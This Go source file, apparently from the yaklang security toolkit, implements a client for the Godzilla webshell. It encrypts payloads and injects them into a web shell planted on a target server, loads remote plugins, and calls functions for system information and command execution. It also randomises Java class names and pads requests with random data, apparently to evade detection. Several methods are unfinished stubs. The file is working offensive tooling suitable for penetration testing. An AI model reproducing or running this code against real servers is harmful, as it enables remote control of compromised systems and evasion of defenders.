package wsm

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/utils/lowhttp/poc"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/wsm/payloads/godzilla"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"net/http"
	"strings"
)

type Godzilla struct {
	Url string
	//
	// 连接参数
	Pass string
	// 密钥
	SecretKey []byte
	// shell 类型
	ShellScript string
	// 加密模式
	EncMode string
	Proxy   string
	// 自定义 header 头
	Headers map[string]string
	// request 开头的干扰字符
	ReqLeft string
	// request 结尾的干扰字符
	ReqRight string

	req             *http.Request
	dynamicFuncName map[string]string

	CustomEncoder codecFunc
}

func NewGodzilla(ys *ypb.WebShell) (*Godzilla, error) {
	gs := &Godzilla{
		Url:             ys.GetUrl(),
		Pass:            ys.GetPass(),
		SecretKey:       secretKey(ys.GetSecretKey()),
		ShellScript:     ys.GetShellScript(),
		EncMode:         ys.GetEncMode(),
		Proxy:           ys.Proxy,
		Headers:         make(map[string]string, 2),
		dynamicFuncName: make(map[string]string, 2),
	}
	gs.CustomEncoder = func(raw []byte) ([]byte, error) {
		enPayload, err := godzilla.Encryption(raw, gs.SecretKey, gs.Pass, gs.EncMode, gs.ShellScript, true)
		if err != nil {
			return nil, err
		}
		return enPayload, nil
	}
	gs.setContentType()
	//if ys.GetHeaders() != nil {
	//	gs.Headers = ys.GetHeaders()
	//}
	return gs, nil
}

func (g *Godzilla) SetPayloadScriptContent(content string) {
	//TODO implement me
	panic("implement me")
}

func (g *Godzilla) ClientRequestEncode(raw []byte) ([]byte, error) {
	//TODO implement me
	panic("implement me")
}

func (g *Godzilla) ServerResponseDecode(raw []byte) ([]byte, error) {
	//TODO implement me
	panic("implement me")
}

func (g *Godzilla) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
	//TODO implement me
	panic("implement me")
}

func (g *Godzilla) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
	//TODO implement me
	panic("implement me")
}

func (g *Godzilla) SetPacketScriptContent(content string) {
	//TODO implement me
	panic("implement me")
}

func (g *Godzilla) setDefaultParams() map[string]string {
	// TODO 添加所有参数
	g.dynamicFuncName["test"] = "test"
	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo"
	g.dynamicFuncName["execCommand"] = "execCommand"
	return g.dynamicFuncName
}

func (g *Godzilla) setContentType() {
	switch g.EncMode {
	case ypb.EncMode_Base64.String():
		g.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.EncMode_Raw.String():
	default:
		panic("shell script type error [JSP/JSPX/ASP/ASPX/PHP]")
	}
}

func (g *Godzilla) getPayload(binCode string) ([]byte, error) {
	var payload []byte
	var err error
	switch g.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		payload, err = hex.DecodeString(godzilla.JavaClassPayload)
		if err != nil {
			return nil, err
		}
		//payload, err = g.dynamicUpdateClassName("payloadv4", payload)
		//payload, err = g.dynamicUpdateClassName("payload", payload)
		//if err != nil {
		//	return nil, err
		//}
	case ypb.ShellScript_PHP.String():
		payload, err = hex.DecodeString(godzilla.PhpCodePayload)
		if err != nil {
			return nil, err
		}
		r1 := utils.RandStringBytes(50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	case ypb.ShellScript_ASPX.String():
		payload, err = hex.DecodeString(godzilla.CsharpDllPayload)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_ASP.String():
		payload, err = hex.DecodeString(godzilla.AspCodePayload)
		if err != nil {
			return nil, err
		}
		r1 := utils.RandStringBytes(50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	}
	return payload, nil
}

// 修改并且记录修改前后的对应关系
func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) ([]byte, error) {
	clsObj, err := javaclassparser.Parse(classContent)
	if err != nil {
		return nil, err
	}
	fakeSourceFileName := utils.RandNumberStringBytes(8)
	err = clsObj.SetSourceFileName(fakeSourceFileName)
	if err != nil {
		return nil, err
	}
	// 原始的 class 就叫 payloav4,代表哥斯拉 v4 版本
	g.dynamicFuncName[oldName+".java"] = fakeSourceFileName + ".java"

	// 替换 execCommand() 函数为 execCommand2() 函数, 这里只是暂时一下替换函数名的功能
	//err = clsObj.SetMethodName("execCommand", "execCommand2")
	//if err != nil {
	//	return nil, err
	//}
	//g.dynamicFuncName["execCommand"] = "execCommand2"

	newClassName := payloads.RandomClassName()
	// 随机替换类名
	err = clsObj.SetClassName(newClassName)
	if err != nil {
		return nil, err
	}
	log.Info(fmt.Sprintf("%s ----->>>>> %s", oldName, newClassName))
	g.dynamicFuncName[oldName] = newClassName
	return clsObj.Bytes(), nil
}

func (g *Godzilla) deCryption(raw []byte) ([]byte, error) {
	deBody, err := godzilla.Decryption(raw, g.SecretKey, g.Pass, g.EncMode, g.ShellScript)
	if err != nil {
		return nil, err
	}
	return deBody, nil
}

func (g *Godzilla) post(data []byte) ([]byte, error) {
	resp, req, err := poc.DoPOST(
		g.Url,
		poc.WithProxy(g.Proxy),
		poc.WithAppendHeaders(g.Headers),
		poc.WithReplaceHttpPacketBody(data, false),
		poc.WithSession("godzilla"),
	)
	if err != nil {
		return nil, utils.Errorf("http request error: %v", err)
	}

	_, raw := lowhttp.SplitHTTPHeadersAndBodyFromPacket(resp.RawPacket)

	if len(raw) == 0 && g.req != nil {
		return nil, utils.Errorf("empty response")
	}
	g.req = req
	raw = bytes.TrimSuffix(raw, []byte("\r\n\r\n"))
	return raw, nil
}

func (g *Godzilla) sendPayload(data []byte) ([]byte, error) {
	body, err := g.post(data)
	if err != nil {
		return nil, err
	}
	if len(body) == 0 {
		return nil, utils.Error("返回数据为空")
	}
	return g.deCryption(body)
}

// EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Parameter) ([]byte, error) {
	// 填充随机长度，避免 test 请求和 getBasicInfo 请求的长度每次都一样
	r1, r2 := utils.RandStringBytes(100), utils.RandStringBytes(10)
	parameter.AddString(r1, r2)
	if className != "" && len(strings.Trim(className, " ")) > 0 {
		switch g.ShellScript {
		case ypb.ShellScript_JSPX.String():
			fallthrough
		case ypb.ShellScript_JSP.String():
			parameter.AddString("evalClassName", g.dynamicFuncName[className])
		case ypb.ShellScript_ASPX.String():
			parameter.AddString("evalClassName", className)
		case ypb.ShellScript_ASP.String():
			fallthrough
		case ypb.ShellScript_PHP.String():
			parameter.AddString("codeName", className)

		}
	}
	parameter.AddString("methodName", funcName)
	data := parameter.Serialize()
	//enData, err := g.enCryption(data)
	enData, err := g.CustomEncoder(data)
	if err != nil {
		return nil, err
	}
	return g.sendPayload(enData)
}

func newParameter() *godzilla.Parameter {
	return godzilla.NewParameter()
}

// Include 远程 shell 加载插件
func (g *Godzilla) Include(codeName string, binCode []byte) (bool, error) {
	parameter := newParameter()
	switch g.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		//binCode, err := g.dynamicUpdateClassName(codeName, binCode)
		//if err != nil {
		//	return false, err
		//}
		g.dynamicFuncName[codeName] = codeName
		codeName = g.dynamicFuncName[codeName]
		if codeName != "" {
			parameter.AddString("codeName", codeName)
			parameter.AddBytes("binCode", binCode)
			result, err := g.EvalFunc("", "include", parameter)
			if err != nil {
				return false, err
			}
			resultString := strings.Trim(string(result), " ")
			if resultString == "ok" {
				return true, nil
			} else {
				return false, utils.Error(resultString)
			}
		} else {
			return false, utils.Errorf("类: %s 映射不存在", codeName)
		}
	case ypb.ShellScript_ASPX.String():
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "include", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true, nil
		} else {
			return false, utils.Error(resultString)
		}
	case ypb.ShellScript_ASP.String():
	case ypb.ShellScript_PHP.String():
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "includeCode", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true, nil
		} else {
			return false, utils.Error(resultString)
		}
	}
	return false, nil
}

func (g *Godzilla) InjectPayload() error {
	payload, err := g.getPayload("")
	if err != nil {
		return err
	}
	enc, err := godzilla.Encryption(payload, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, false)

	if err != nil {
		return err
	}
	_, err = g.post(enc)
	if err != nil {
		return err
	}
	return nil
}

func (g *Godzilla) InjectPayloadIfNoCookie() error {
	if g.req == nil {
		err := g.InjectPayload()
		if err != nil {
			return err
		}
	}
	return nil
}

// 销毁一个会话中的全部数据,可以清除缓存文件夹中的 sess_PHPSESSID 文件
func (g *Godzilla) close() (bool, error) {
	parameter := newParameter()
	res, err := g.EvalFunc("", "close", parameter)
	if err != nil {
		return false, err
	}
	result := string(res)
	if "ok" == result {
		return true, nil
	} else {
		return false, utils.Error(result)
	}
}

//func (g *Godzilla) Encoder(f func(raw []byte) ([]byte, error)) ([]byte, error) {
//	g.CustomEncoder = encoderFunc
//	return nil, nil
//}

func (g *Godzilla) String() string {
	return fmt.Sprintf(
		"Url: %s, SecretKey: %x, ShellScript: %s, Proxy: %s, Headers: %v",
		g.Url,
		g.SecretKey,
		g.ShellScript,
		g.Proxy,
		g.Headers,
	)
}

func (g *Godzilla) GenWebShell() string {
	return ""
}

func (g *Godzilla) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return false, nil
	}
	parameter := newParameter()
	result, err := g.EvalFunc("", "test", parameter)
	if err != nil {
		return false, err
	}
	if strings.Trim(string(result), " ") == "ok" {
		return true, nil
	} else {
		return false, utils.Error(result)
	}
}

func (g *Godzilla) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	parameter := newParameter()
	basicsInfo, err := g.EvalFunc("", "getBasicsInfo", parameter)
	if err != nil {
		return nil, err
	}
	return parseBaseInfoToJson(basicsInfo), nil
}

func (g *Godzilla) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}
	return nil, nil
}

func (g *Godzilla) FileManagement() {

}
